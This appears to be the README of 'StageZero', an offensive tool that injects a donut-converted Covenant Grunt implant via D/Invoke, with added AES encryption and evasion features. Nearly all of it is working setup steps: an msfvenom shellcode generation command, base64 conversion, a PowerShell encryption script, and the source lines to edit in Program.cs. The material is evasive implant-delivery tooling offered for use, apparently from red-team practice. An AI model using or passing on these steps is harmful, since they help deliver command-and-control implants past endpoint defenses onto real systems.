# StageZero - Original:

 https://gist.github.com/ChoiSG/e84e9ae9aa325b477e49264ffef56097
 
 
Added AES encryption & Evasive features:

StageZero using dinvoke to inject donut'ed covenant grunt 
 
 ```bash
 msfvenom -p windows/x64/exec cmd=calc.exe -f raw -o calc.bin
 ```
 
 ```bash
 py3 .\BIN-2-base64.py .\calc.bin
 
 save as GruntHTTP.bin.b64
 ```
 
 ```bash
 .\encrypt-shellcode.ps1 -ShellcodePath .\GruntHTTP.bin.b64
 ```
 
 Edit lines 158 -160 in Program.cs
